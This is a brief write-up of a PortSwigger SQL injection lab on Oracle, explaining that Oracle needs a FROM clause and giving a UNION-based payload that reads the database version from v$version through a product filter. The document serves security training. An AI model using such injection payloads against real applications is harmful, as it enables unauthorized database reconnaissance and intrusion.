# Lab: SQL injection attack, querying the database type and version on Oracle (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

**Description:** Use a UNION-based injection in the product filter to display the Oracle database version.

**Goal:** Display the database version string.

## Solution

Oracle requires a `FROM` clause even for simple selects. Use `dual` or system views.

```
' UNION SELECT BANNER, NULL FROM v$version--
```

